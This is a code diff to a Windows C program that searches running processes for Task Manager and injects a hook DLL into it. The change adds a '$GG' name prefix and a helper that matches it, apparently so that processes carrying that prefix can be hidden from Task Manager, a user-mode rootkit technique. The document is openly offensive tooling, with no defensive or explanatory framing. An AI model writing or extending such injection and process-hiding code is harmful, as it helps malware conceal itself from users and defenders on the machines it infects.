@@ -1,6 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <winternl.h>
+#include <Shlwapi.h>
+
+#pragma comment(lib, "Shlwapi.lib")
 
 #define DLL_PATH  L"C:\\Users\\6appy\\Desktop\\Cprojects\\Hider\\$Build\\x64_Hook.dll"
 
@@ -10,6 +13,15 @@ typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
     _In_ ULONG SystemInformationLength,
     _Out_opt_ PULONG ReturnLength
     );
+
+#define HIDE_PREFIX								L"$GG"
+
+#define HIDE_PREFIX_LENGTH						(sizeof(HIDE_PREFIX) / sizeof(WCHAR) - 1)
+
+BOOL HasPrefix(LPCWSTR str)
+{
+    return str && !StrCmpNIW(str, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
+}
 
 BOOL LoadDll(IN HANDLE hProcess, IN LPWSTR DllName) {
 
@@ -87,7 +99,7 @@ BOOL SearchForProcess(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
     SystemInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemInfo + SystemInfo->NextEntryOffset);
 
     while (TRUE) {
-
+        
         if (SystemInfo->ImageName.Length && wcscmp(SystemInfo->ImageName.Buffer, L"Taskmgr.exe") == 0) {
             printf("(i) Task Manager has been found. Injecting...\n");
             // dll injection
@@ -101,6 +113,7 @@ BOOL SearchForProcess(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
             printf("(-) Not looking for this process...\n");
 
         }
+        
         
 
         if (!SystemInfo->NextEntryOffset)
@@ -119,9 +132,11 @@ int main(void) {
     DWORD Pid = { 0 };
     HANDLE hProcess = { 0 };
 
+
     if (!(SearchForProcess(&Pid, &hProcess))) {
         return -1;
     }
+
 
     printf("(#) Press [ENTER] To Quit...\n");
     getchar();
